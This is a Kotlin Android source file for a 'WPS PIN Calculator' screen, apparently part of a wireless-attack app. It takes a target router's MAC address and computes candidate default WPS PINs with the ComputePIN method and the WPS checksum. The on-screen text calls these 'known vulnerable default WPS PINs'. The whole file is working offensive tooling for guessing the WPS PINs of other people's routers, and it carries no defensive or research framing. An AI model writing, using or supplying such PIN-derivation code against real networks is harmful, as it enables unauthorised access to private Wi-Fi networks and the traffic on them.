package com.fearmikey.rf_reapr.ui.wireless

import androidx.compose.foundation.layout.*
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.Password
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun WpsPinCalculatorScreen(onBack: () -> Unit) {
    var bssidInput by remember { mutableStateOf("") }
    var results by remember { mutableStateOf<List<Pair<String, String>>>(emptyList()) }

    fun generateChecksum(pin: Long): Long {
        var accum = 0L
        var p = pin
        while (p > 0) {
            accum += 3 * (p % 10)
            p /= 10
            accum += p % 10
            p /= 10
        }
        return (10 - accum % 10) % 10
    }

    fun calculatePins() {
        val cleanBssid = bssidInput.replace("[:-]".toRegex(), "").uppercase()
        if (cleanBssid.length != 12) {
            results = emptyList()
            return
        }

        try {
            val pins = mutableListOf<Pair<String, String>>()
            
            // 24-bit PIN
            val mac24 = cleanBssid.substring(6).toLong(16)
            val pin24 = (mac24 % 10000000)
            val fullPin24 = pin24 * 10 + generateChecksum(pin24)
            pins.add("24-bit (ComputePIN)" to String.format(java.util.Locale.US, "%08d", fullPin24))

            // 28-bit PIN
            val mac28 = cleanBssid.substring(5).toLong(16)
            val pin28 = (mac28 % 10000000)
            val fullPin28 = pin28 * 10 + generateChecksum(pin28)
            pins.add("28-bit (ComputePIN)" to String.format(java.util.Locale.US, "%08d", fullPin28))

            // 32-bit PIN
            val mac32 = cleanBssid.substring(4).toLong(16)
            val pin32 = (mac32 % 10000000)
            val fullPin32 = pin32 * 10 + generateChecksum(pin32)
            pins.add("32-bit (ComputePIN)" to String.format(java.util.Locale.US, "%08d", fullPin32))
            
            // 36-bit PIN
            val mac36 = cleanBssid.substring(3).toLong(16)
            val pin36 = (mac36 % 10000000)
            val fullPin36 = pin36 * 10 + generateChecksum(pin36)
            pins.add("36-bit (ComputePIN)" to String.format(java.util.Locale.US, "%08d", fullPin36))

            // 40-bit PIN
            val mac40 = cleanBssid.substring(2).toLong(16)
            val pin40 = (mac40 % 10000000)
            val fullPin40 = pin40 * 10 + generateChecksum(pin40)
            pins.add("40-bit (ComputePIN)" to String.format(java.util.Locale.US, "%08d", fullPin40))

            results = pins
        } catch (e: Exception) {
            results = emptyList()
        }
    }

    LaunchedEffect(bssidInput) {
        calculatePins()
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("WPS PIN Calculator") },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back")
                    }
                }
            )
        }
    ) { padding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .padding(16.dp),
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            OutlinedTextField(
                value = bssidInput,
                onValueChange = { bssidInput = it },
                label = { Text("Target BSSID (MAC Address)") },
                placeholder = { Text("00:1A:2B:3C:4D:5E") },
                modifier = Modifier.fillMaxWidth(),
                singleLine = true
            )
            
            HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp))
            
            if (results.isEmpty() && bssidInput.length >= 12) {
                Text("Invalid MAC Address format", color = MaterialTheme.colorScheme.error)
            } else if (results.isNotEmpty()) {
                Text("Suggested PINs", style = MaterialTheme.typography.titleMedium)
                results.forEach { (algo, pin) ->
                    Card(modifier = Modifier.fillMaxWidth()) {
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .padding(16.dp),
                            horizontalArrangement = Arrangement.SpaceBetween
                        ) {
                            Text(algo, style = MaterialTheme.typography.bodyMedium)
                            Text(pin, style = MaterialTheme.typography.labelLarge)
                        }
                    }
                }
            } else {
                Row(modifier = Modifier.fillMaxWidth()) {
                    Icon(Icons.Default.Password, contentDescription = null, tint = MaterialTheme.colorScheme.primary)
                    Spacer(modifier = Modifier.width(8.dp))
                    Text("Enter a router's MAC address to calculate known vulnerable default WPS PINs.")
                }
            }
        }
    }
}
